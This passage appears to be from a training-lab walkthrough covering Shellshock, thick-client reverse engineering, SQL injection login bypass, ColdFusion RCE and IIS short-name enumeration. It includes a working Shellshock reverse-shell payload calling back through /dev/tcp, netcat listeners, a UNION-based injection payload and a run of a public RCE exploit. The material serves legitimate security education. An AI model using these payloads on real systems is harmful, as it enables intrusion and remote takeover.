list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:112:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash
```

Subsequently, students need to start an `nc` listener to prepare for a reverse shell:

Code: shell

```shell
sudo nc -lvnp PWNPO
```

```shell-session
┌─[us-academy-2]─[10.10.15.12]─[htb-ac-594497@htb-geylz278ib]─[~]
└──╼ [★]$ sudo nc -lvnp 7777

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
```

Then, students need to send a reverse-shell payload:

Code: shell

```shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1' http://STMIP/cgi-bin/access.cgi
```

```shell-session
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.12/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
```

When checking the `nc` listener, students will notice that the reverse shell connection has been established successfully:

```shell-session
Ncat: Connection from 10.129.205.27.
Ncat: Connection from 10.129.205.27:57546.
bash: cannot set terminal process group (951): Inappropriate ioctl for device
bash: no job control in this shell
www-data@htb:/usr/lib/cgi-bin$ 
```

Finally, students need to read the flag.txt file with `cat`, finding it to be `Sh3ll_Sh0cK_123`:

Code: shell

```shell
cat flag.txt
```

```shell-session
www-data@htb:/usr/lib/cgi-bin$ cat flag.txt

cat flag.txt
Sh3ll_Sh0cK_123
```

Answer: `Sh3ll_Sh0cK_123`

# Attacking Thick Client Applications

## Question 1

### "Perform an analysis of C:\\Apps\\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password."

Students need to first connect to the spawned target with the credentials `cybervaca:&aue%C)}6g-d{w` using RDP while specifying a shared drive:

Code: shell

```shell
xfreerdp /v:STMIP /u:cybervaca /p:'&aue%C)}6g-d{w' /dynamic-resolution /drive:share,/home/htb-ac-594497
```

```shell-session
┌─[us-academy-2]─[10.10.15.12]─[htb-ac-594497@htb-geylz278ib]─[~]
└──╼ [★]$ xfreerdp /v:STMIP /u:cybervaca /p:'&aue%C)}6g-d{w' /dynamic-resolution /drive:share,/home/htb-ac-594497

[16:12:24:734] [14803:14807] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
<SNIP>
```

Then, students need to navigate to to `C:\TOOLS\ProcessMonitor` and launch `Procmon64`:

![Attacking_Common_Applications_Walkthrough_Image_61.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_61.png)

Clicking `Agree` when prompted, once `Procmon64` is running, students need use File Explorer to copy the `Restart-OracleService` script from the `sysvol` share to the Desktop:

![Attacking_Common_Applications_Walkthrough_Image_62.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_62.png)

Then, students need to open Command Prompt, navigate to the Desktop, and run the `Restart-OracleService.exe` application:

Code: cmd

```cmd
cd Desktop
.\Restart-OracleService.exe
```

```cmd-session
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\cybervaca>cd Desktop

C:\Users\cybervaca\Desktop>.\Restart-OracleService.exe
```

Checking `Procmon`, students need to filter for Process names, allowing only the `Restart-OracleService.exe` process to be shown:

![Attacking_Common_Applications_Walkthrough_Image_63.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_63.png)

Students will notice that the executable creates a temp file in `C:\Users\cybervaca\AppData\Local\Temp`:

![Attacking_Common_Applications_Walkthrough_Image_64.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_64.png)

Students need remove permission entries leaving only `cybervaca` , disabling inheritance on the folder and unchecking the boxes for `Delete / Delete subfolders and files`:

![Attacking_Common_Applications_Walkthrough_Image_65.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_65.png)

![Attacking_Common_Applications_Walkthrough_Image_66.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_66.png)

Students need to apply these same permission entries on `SYSTEM` and `Administrators`, ultimately showing all three as having `Special` access:

![Attacking_Common_Applications_Walkthrough_Image_67.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_67.png)

Running the `Restart-OracleService.exe` application, students will see the creation of a Windows Batch File:

Code: cmd

```cmd
.\Restart-OracleService.exe
```

```cmd-session
c:\Users\cybervaca\Desktop>.\Restart-OracleService.exe
```

![Attacking_Common_Applications_Walkthrough_Image_68.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_68.png)

Students need edit the script in `Notepad`, modifying it to no longer delete the `monta.ps1` and `oracle.txt` files:

![Attacking_Common_Applications_Walkthrough_Image_69.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_69.png)

![Attacking_Common_Applications_Walkthrough_Image_70.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_70.png)

Saving the changes, students need run the script again by double-clicking it. Then, they need confirm that `monta.ps1` and `oracle.txt` files exist in `C:\ProgramData`:

![Attacking_Common_Applications_Walkthrough_Image_71.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_71.png)

Afterward, students need to launch PowerShell as administrator and run `monta.ps1`:

Code: powershell

```powershell
cd C:\Programdata
cat .\monta.ps1
.\monta.ps1
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Programdata

PS C:\Programdata> cat .\monta.ps1
$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))

PS C:\Programdata> .\monta.ps1
```

This will create a new executable, `restart-service.exe`, inside of `C:\ProgramData`, and students need to copy it to the Desktop:

![Attacking_Common_Applications_Walkthrough_Image_72.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_72.png)

Subsequently, students need to open `x64dbg` as Administrator and select `File` --> `Open` and select the `restart-service.exe` file:

![Attacking_Common_Applications_Walkthrough_Image_73.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_73.png)

The preferences must also be set to break on `Exit Breakpoint`:

![Attacking_Common_Applications_Walkthrough_Image_74.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_74.png)

Running the program, students need to check the Memory map, looking for Type `MAP` with `Read/Write` protection:

![Attacking_Common_Applications_Walkthrough_Image_75.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_75.png)

Students need to right click and Follow in Dump. There, they should notice the ASCII header seen when running the executable:

![Attacking_Common_Applications_Walkthrough_Image_76.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_76.png)

With the correct address verified, students need to `Dump Memory to File`, saving the memory dump to the Desktop. Then, students need to drag and drop the memory dump onto `de4dot.exe` under `C:\TOOLS\de4dot\`:

![Attacking_Common_Applications_Walkthrough_Image_77.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_77.png)

Subsequently, students need to drag and drop the cleaned .`bin` file onto `dnSpy`, finding the credentials `svc_oracle:#oracle_s3rV1c3!2010`:

![Attacking_Common_Applications_Walkthrough_Image_78.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_78.png)

Answer: `svc_oracle:#oracle_s3rV1c3!2010`

# Exploiting Web Vulnerabilities in Thick-Client Applications

## Question 1

### "What is the IP address of the eth0 interface under the ServerStatus -> Ipconfig tab in the fatty-client application?"

After spawning the target machine, students need to first connect to the target with the credentials `cybervaca:&aue%C)}6g-d{w` using RDP:

Code: shell

```shell
xfreerdp /v:STMIP /u:cybervaca /p:'&aue%C)}6g-d{w' /dynamic-resolution
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac-594497@htb-ykablsqh4y]─[~]
└──╼ [★]$ xfreerdp /v:10.129.153.234 /u:cybervaca /p:'&aue%C)}6g-d{w' /dynamic-resolution

[22:30:02:859] [8648:8649] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[22:30:02:859] [8648:8649] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[22:30:02:859] [8648:8649] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
```

Subsequently, students need to open File Explorer, navigate to `C:\Apps` and right click on `fatty-client` to extract files:

![Attacking_Common_Applications_Walkthrough_Image_79.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_79.png)

Having extracted the contents of the thick client to a folder, students need to go in the newly created directory and Edit the `beans.xml` document, replacing the port `8000` with `1337`:

![Attacking_Common_Applications_Walkthrough_Image_80.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_80.png)

Additionally, students need to remove the hashes from `META-INF/MANIFEST.MF` , ensuring the file ends with a new line:

![Attacking_Common_Applications_Walkthrough_Image_81.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_81.png)

Additionally, students must delete the `1.RSA` and `1.SF` files:

![Attacking_Common_Applications_Walkthrough_Image_82.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_82.png)

Once the changes have been saved, students need open PowerShell and update the `fatty-client.jar` , saving it as `fatty-client-new.jar`:

Code: powershell

```powershell
cd C:\Apps\fatty-client\
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\cybervaca> cd C:\Apps\fatty-client\
PS C:\Apps\fatty-client> jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
PS C:\Apps\fatty-client>
```

Students need to drag and drop the new jar file into `jd-gui`, then select `File` --> `Save All Sources`:

![Attacking_Common_Applications_Walkthrough_Image_83.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_83.png)

Subsequently, students need to extract the `fatty-client-new.jar.src.zip` archive to the Desktop and edit the `fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java` file, replacing the `configs` folder name with `..`:

![Attacking_Common_Applications_Walkthrough_Image_84.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_84.png)

Saving the changes, students need to open PowerShell and compile the `ClientGuiTest.Java` file:

Code: powershell

```powershell
cd C:\Users\cybervaca\Desktop\
javac -cp fatty-client-new.jar fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java
mkdir raw
cp fatty-client-new.jar raw/fatty-client-new-2.jar
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Users\cybervaca\Desktop\
PS C:\Users\cybervaca\Desktop> javac -cp fatty-client-new.jar fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java
PS C:\Users\cybervaca\Desktop> mkdir raw


    Directory: C:\Users\cybervaca\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         4/1/2023   1:28 AM                raw


PS C:\Users\cybervaca\Desktop> cp fatty-client-new.jar raw/fatty-client-new-2.jar
```

Students then need to decompress the `fatty-client-new-2.jar` by right-clicking and selecting `Extract Here`:

![Attacking_Common_Applications_Walkthrough_Image_85.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_85.png)

Afterward, students need to overwrite any existing `htb/fatty/client/gui/*.class` files with the updated class files:

Code: powershell

```powershell
mv -Force fatty-client-new.jar.src/htb/fatty/client/gui/*.class raw/htb/fatty/client/gui/
```

```powershell-session
PS C:\Users\cybervaca\Desktop> mv -Force fatty-client-new.jar.src/htb/fatty/client/gui/*.class raw/htb/fatty/client/gui/
```

Now, students can build the new JAR file:

Code: powershell

```powershell
cd raw
jar -cmf META-INF/MANIFEST.MF traverse.jar .
```

```powershell-session
PS C:\Users\cybervaca\Desktop> cd raw
PS C:\Users\cybervaca\Desktop\raw> jar -cmf META-INF/MANIFEST.MF traverse.jar .
```

Once completed, students need to launch `traverse.jar` and authenticate as `qtc:clarabibi`. Then, they need to go to `FileBrowser` --> `Configs`, viewing the start.sh script:

![Attacking_Common_Applications_Walkthrough_Image_86.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_86.png)

This utility allows the thick client to view/retrieve files hosted on the remote server, and reveals the existence of the application server `fatty-server.jar`.

Now, students need to modify the `open` function in `fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java` to be able to download the file `fatty-server.jar`:

Code: java

```java
import java.io.FileOutputStream;
```

![Attacking_Common_Applications_Walkthrough_Image_87.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_87.png)

Code: java

```java
public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
        return "Error: Method '" + methodName + "' is not allowed for this user account";
    }
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);
    
    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }
    
    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();
    
    return "Successfully saved the file to " + desktopPath;
}
```

![Attacking_Common_Applications_Walkthrough_Image_88.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_88.png)

Saving the changes, students need to rebuild the jar again:

Code: powershell

```powershell
javac -cp fatty-client-new.jar .\fatty-client-new.jar.src\htb\fatty\client\methods\Invoker.java
mv -Force .\fatty-client-new.jar.src\htb\fatty\client\methods\*.class .\raw\htb\fatty\client\methods\
cd raw
jar -cmf META-INF/MANIFEST.MF fatty-client-modified.jar .
```

```powershell-session
PS C:\Users\cybervaca\Desktop> javac -cp fatty-client-new.jar .\fatty-client-new.jar.src\htb\fatty\client\methods\Invoker.java
PS C:\Users\cybervaca\Desktop> mv -Force .\fatty-client-new.jar.src\htb\fatty\client\methods\*.class .\raw\htb\fatty\client\methods\
PS C:\Users\cybervaca\Desktop> cd raw
PS C:\Users\cybervaca\Desktop\raw> jar -cmf META-INF/MANIFEST.MF fatty-client-modified.jar .
```

Launching the newly compiled jar, students need to login to download the `fatty-server.jar` :

![Attacking_Common_Applications_Walkthrough_Image_89.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_89.png)

![Attacking_Common_Applications_Walkthrough_Image_90.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_90.png)

Students need to drag and drop the `fatty-server.jar` onto `jd-gui`, and then click on `File` --> `Save All Sources`:

![Attacking_Common_Applications_Walkthrough_Image_91.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_91.png)

Decompiling the `fatty-server.jar` using JD-GUI reveals the file `htb/fatty/server/database/FattyDbSession.class` that contains a `checkLogin()` function that handles the login functionality. This function retrieves user details based on the provided username. It then compares the retrieved password with the provided password:

Code: java

```java
public User checkLogin(User user) throws LoginException {
    <SNIP>
      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
      <SNIP>
        if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
          return newUser; 
        throw new LoginException("Wrong Password!");
      <SNIP>
           this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
      return null;
```

The login button creates the new object `ClientGuiTest.this.user` for the `User` class. It then calls the `setUsername()` and `setPassword()` functions with the respective username and password values. The values that are returned from these functions are then sent to the server:

![Attacking_Common_Applications_Walkthrough_Image_92.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_92.png)

When checking `setUsername()` and `setPassword()` functions from `htb/fatty/client/shared/resources/user.java`, students will know that username gets accepted without any modification, but the password is changed to be the `sha256` hash digest of the username value, the password value, and the string "clarabibimakeseverythingsecure":

Code: java

```java
public void setUsername(String username) {
    this.username = username;
  }
  
  public void setPassword(String password) {
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = null;
    try {
      digest = MessageDigest.getInstance("SHA-256");
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    } 
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
    this.password = DatatypeConverter.printHexBinary(hash);
  }
```

Students will notice that the username isn't sanitized and is directly used in the SQL query, making it vulnerable to SQL injection. Students need to leverage the injection in the `username` field to create a fake user entry:

Code: java

```java
test' UNION SELECT 1,'invaliduser','invalid@a.b','invalidpass','admin
```

Beforehand, students need to edit the code in `htb/fatty/shared/resources/User.java` to submit the password as it is from the client application:

Code: java

```java
public void setPassword(String password) {
    this.password = password;
}
```

![Attacking_Common_Applications_Walkthrough_Image_93.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_93.png)

Code: java

```java
public User(int uid, String username, String password, String email, Role role) {
    this.uid = uid;
    this.username = username;
    this.password = password;
    this.email = email;
    this.role = role;
}
```

![Attacking_Common_Applications_Walkthrough_Image_94.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_94.png)

Students need to recompile the java class files, and then create a new JAR:

Code: powershell

```powershell
javac -cp .\fatty-client-new.jar .\fatty-client-new.jar.src\htb\fatty\shared\resources\User.java
mv -Force .\fatty-client-new.jar.src\htb\fatty\shared\resources\*.class .\raw\htb\fatty\shared\resources\
cd .\raw\
jar -cmf .\META-INF\MANIFEST.MF inject.jar .
```

```powershell-session
PS C:\Users\cybervaca\Desktop> javac -cp .\fatty-client-new.jar .\fatty-client-new.jar.src\htb\fatty\shared\resources\User.java
PS C:\Users\cybervaca\Desktop> mv -Force .\fatty-client-new.jar.src\htb\fatty\shared\resources\*.class .\raw\htb\fatty\shared\resources\
PS C:\Users\cybervaca\Desktop> cd .\raw\
PS C:\Users\cybervaca\Desktop\raw> jar -cmf .\META-INF\MANIFEST.MF inject.jar .
```

Finally, students need to run the newly compiled `inject.jar` and bypass the login with a SQL injection payload (using `abc` as the password):

Code: sql

```sql
abc' UNION SELECT 1,'abc','a@b.com','abc','admin
```

![Attacking_Common_Applications_Walkthrough_Image_95.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_95.png)

Having successfully bypassed the login as a privileged user, students need to finally check the IP address of the `eth0` interface, finding it to be `172.28.0.3`:

![Attacking_Common_Applications_Walkthrough_Image_96.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_96.png)

![Attacking_Common_Applications_Walkthrough_Image_97.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_97.png)

Answer: `172.28.0.3`

# ColdFusion - Discovery & Enumeration

## Question 1

### "What ColdFusion protocol runs on port 5500?"

From the section's reading, students know that the `Server Monitor` protocol runs on port 5500:

![Attacking_Common_Applications_Walkthrough_Image_98.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_98.png)

Answer: `Server Monitor`

# Attacking ColdFusion

## Question 1

### "What user is ColdFusion running as?"

After spawning the target machine, students need to use `searchsploit` to mirror the `50057.py` exploit file:

Code: shell

```shell
searchsploit -m 50057.py
```

```shell-session
┌─[us-academy-1]─[10.10.14.149]─[htb-ac-413848@htb-w6o57y3g3a]─[~]
└──╼ [★]$ searchsploit -m 50057.py

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied to: /home/htb-ac-413848/50057.py
```

Then, students need to modify the connection information in the script, adjusting for `STMIP` and `PWNIP`:

![Attacking_Common_Applications_Walkthrough_Image_99.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_99.png)

At last, students need to run the script to achieve remote code execution:

Code: shell

```shell
python3 50057.py
```

```shell-session
┌─[us-academy-1]─[10.10.14.125]─[htb-ac-594497@htb-vunctsni1b]─[~]
└──╼ [★]$ python3 50057.py

Generating a payload...
Payload size: 1498 bytes
Saved as: 5b837f3e1175462e8d8229e3901e92d5.jsp

<SNIP>

lhost: 10.10.14.125
lport: 4444
rhost: 10.129.231.114
rport: 8500
payload: 5b837f3e1175462e8d8229e3901e92d5.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.231.114.
Ncat: Connection from 10.129.231.114:49238.
```

Once the reverse shell has been established, students need enumerate the current user, finding it to be `arctic\tolis`:

Code: shell

```shell
whoami
```

```shell-session
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami

whoami
arctic\tolis
```

Answer: `arctic\tolis`

# IIS Tilde Enumeration

## Question 1

### "What is the full .aspx filename that Gobuster identified?"

After spawning the target machine, students need to clone [IIS Short Name Scanner](git clone https://github.com/irsdl/IIS-ShortName-Scanner.git) to `Pwnbox`:

Code: shell

```shell
git clone https://github.com/irsdl/IIS-ShortName-Scanner.git
```

```shell-session
┌─[us-academy-1]─[10.10.14.125]─[htb-ac-594497@htb-vunctsni1b]─[~]
└──╼ [★]$ git clone https://github.com/irsdl/IIS-ShortName-Scanner.git

Cloning into 'IIS-ShortName-Scanner'...
remote: Enumerating objects: 430, done.
remote: Counting objects: 100% (93/93), done.
remote: Compressing objects: 100% (58/58), done.
remote: Total 430 (delta 36), reused 72 (delta 22), pack-reused 337
Receiving objects: 100% (430/430), 5.17 MiB | 45.65 MiB/s, done.
Resolving deltas: 100% (210/210), done.
```

Then, students need to download and install Java:

Code: shell

```shell
wget https://download.oracle.com/java/21/latest/jdk-21_linux-x64_bin.deb
sudo apt install ./jdk-21_linux-x64_bin.deb
```

```shell-session
┌─[us-academy-1]─[10.10.14.125]─[htb-ac-594497@htb-fpluv3a98q]─[~]
└──╼ [★]$ wget https://download.oracle.com/java/21/latest/jdk-21_linux-x64_bin.deb

--2026-03-31 11:08:29--  https://download.oracle.com/java/21/latest/jdk-21_linux-x64_bin.deb
Resolving download.oracle.com (download.oracle.com)... 23.214.208.115
Connecting to download.oracle.com (download.oracle.com)|23.214.208.115|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 167892824 (160M) [application/octet-stream]
Saving to: ‘jdk-21_linux-x64_bin.deb’

jdk-21_linux-x64_bi 100%[===================>] 160.11M   105MB/s    in 1.5s    

2026-03-31 11:08:31 (105 MB/s) - ‘jdk-21_linux-x64_bin.deb’ saved [167892824/167892824]

┌─[us-academy-1]─[10.10.14.125]─[htb-ac-594497@htb-fpluv3a98q]─[~]
└──╼ [★]$ sudo apt install ./jdk-21_linux-x64_bin.deb 

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Note, selecting 'jdk-20' instead of './jdk-20_linux-x64_bin.deb'
The following packages were automatically installed and are no longer required:
  libgit2-1.1 libmbedcrypto3 libmbedtls12 libmbedx509-0 libstd-rust-1.48
  libstd-rust-dev linux-kbuild-5.18 rust-gdb
Use 'sudo apt autoremove' to remove them.
The following additional packages will be installed:
  libc6-x32
The following NEW packages will be installed:
  jdk-20 libc6-x32
0 upgraded, 2 newly installed, 0 to remove and 108 not upgraded.
Need to get 2,680 kB/166 MB of archives.
After this operation, 349 MB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 https://deb.parrot.sh/parrot parrot/main amd64 libc6-x32 amd64 2.31-13+deb11u5 [2,680 kB]
Get:2 /home/htb-ac-594497/jdk-20_linux-x64_bin.deb jdk-20 amd64 20-ga [163 MB]
Fetched 2,680 kB in 2s (1,767 kB/s)
Selecting previously unselected package libc6-x32.
(Reading database ... 473878 files and directories currently installed.)
Preparing to unpack .../libc6-x32_2.31-13+deb11u5_amd64.deb ...
Unpacking libc6-x32 (2.31-13+deb11u5) ...
Selecting previously unselected package jdk-20.
Preparing to unpack .../jdk-20_linux-x64_bin.deb ...
Unpacking jdk-20 (20-ga) ...
<SNIP>
```

The Java version can then be confirmed:

Code: shell

```shell
java -version
```

```shell-session
┌─[us-academy-1]─[10.10.14.125]─[htb-ac-594497@htb-fpluv3a98q]─[~]
└──╼ [★]$ java -version

java version "21.0.10" 2026-01-20 LTS
Java(TM) SE Runtime Environment (build 21.0.10+8-LTS-217)
Java HotSpot(TM) 64-Bit Server VM (build 21.0.10+8-LTS-217, mixed mode, sharing)
```

Now, students need to run the `IIS Shortname Scanner` tool against the target, selecting "No" when asked to use a proxy :

Code: shell

```shell
cd IIS-ShortName-Scanner/release/
java -jar iis_shortname_scanner.jar 0 5 http://STMIP/
```

```shell-session
┌─[us-academy-1]─[10.10.14.125]─[htb-ac-594497@htb-fpluv3a98q]─[~]
└──╼ [★]$ cd IIS-ShortName-Scanner/release/
┌─[us-academy-1]─[10.10.14.125]─[htb-ac-594497@htb-fpluv3a98q]─[~/IIS-ShortName-Scanner/release]
└──╼ [★]$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.252.121/
Do you want to use proxy [Y=Yes, Anything Else=No]? No
Early result: the target is probably vulnerable.
Early result: identified letters in names > A,C,D,E,F,L,N,O,P,R,S,T,U,X
Early result: identified letters in extensions > A,C,P,S
# IIS Short Name (8.3) Scanner version 2023.4 - scan initiated 2026/03/31 11:28:26
Target: http://10.129.252.121/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/.rem
|_ Extra information:
  |_ Number of sent requests: 571
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 2
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ TRANSF~1.ASP
```

The tool discovers two directories and three files. However, the remaining filename still needs to be bruteforced. Therefore, students need to generate a wordlist:

Code: shell

```shell
egrep -R ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.125]─[htb-ac-594497@htb-fpluv3a98q]─[~/IIS-ShortName-Scanner/release]
└──╼ [★]$ egrep -R ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
```

Finally, students need to run Gobuster with the newly created wordlist to fuzz the filename, finding `transfer.aspx`:

Code: shell

```shell
gobuster dir -u http://STMIP/ -w /tmp/list.txt -x .aspx,.asp
```

```shell-session
┌─[us-academy-1]─[10.10.14.125]─[htb-ac-594497@htb-fpluv3a98q]─[~/IIS-ShortName-Scanner/release]
└──╼ [★]$ gobuster dir -u http://10.129.252.121/ -w /tmp/list.txt -x .aspx,.asp

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.252.121/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              aspx,asp
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200) [Size: 941]
                                               
===============================================================
Finished
===============================================================
```

Answer: `transfer.aspx`

# Attacking LDAP

## Question 1

